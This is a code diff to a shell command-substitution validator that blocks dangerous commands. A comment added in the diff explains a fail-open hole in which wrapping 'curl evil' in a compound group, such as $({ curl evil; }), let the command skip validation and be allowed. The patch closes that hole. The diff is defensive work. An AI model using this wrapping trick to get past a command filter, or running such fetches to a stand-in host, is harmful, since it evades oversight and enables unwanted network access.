@@ -867,9 +867,18 @@ class SubstitutionValidator:
         # Dropping it here would silently skip validation -> fail OPEN. Per-segment logic blocks
         # the unrenderable segment instead. Non-list substitutions with no extractable command
         # stay dropped (genuinely unparseable).
+        #
+        # `compound` earns the same protection, and for the same reason. $({ curl evil; }) and
+        # $( ( curl evil ) ) render to None because a compound's first child is a reservedword
+        # with no `.parts`, so this guard dropped the WHOLE substitution and curl was never
+        # validated -> ALLOW, while the bare $(curl evil) BLOCKs. Retaining the node lets
+        # _has_dangerous_inner_structure's "compound command in substitution" check fire.
+        # Found by the LAB-912 expert panel; the hole predates the native tier (bashlex emits
+        # `compound` for `{ … }` too) and widened to every clause once T2c mapped
+        # if/while/for/case/functions onto `compound`.
         cmd_node = getattr(node, "command", None)
-        is_list = getattr(cmd_node, "kind", None) == "list"
-        if not inner_command and not is_list:
+        keeps_structure = getattr(cmd_node, "kind", None) in ("list", "compound")
+        if not inner_command and not keeps_structure:
             return None
 
         base_command = self._extract_base_command(node)
